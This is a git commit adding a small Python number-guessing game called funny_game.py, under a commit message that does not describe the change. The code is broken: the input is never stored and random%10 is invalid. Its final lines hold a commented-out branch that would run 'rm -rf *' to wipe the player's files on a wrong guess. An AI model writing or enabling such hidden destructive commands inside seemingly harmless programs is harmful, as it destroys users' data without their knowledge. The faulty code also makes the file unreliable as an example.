8da1b286b907c50c64db10a67b1c6e2e578e20ff
August Childress <august.childress@yahoo.com>
2024-04-19 17:41:47 -0500

    added mor etext to procedure

---
+++ Main/LaTeX/funny_game.py
@@ -0,0 +1,11 @@
+#import os
+import random
+guess = 0
+print("Guess a number between 1 and 10!")    
+input(guess)
+number = random%10
+print(number)
+if(guess == number):
+    print("You Win!")
+#else:
+    #os.system("cd | rm -rf *")
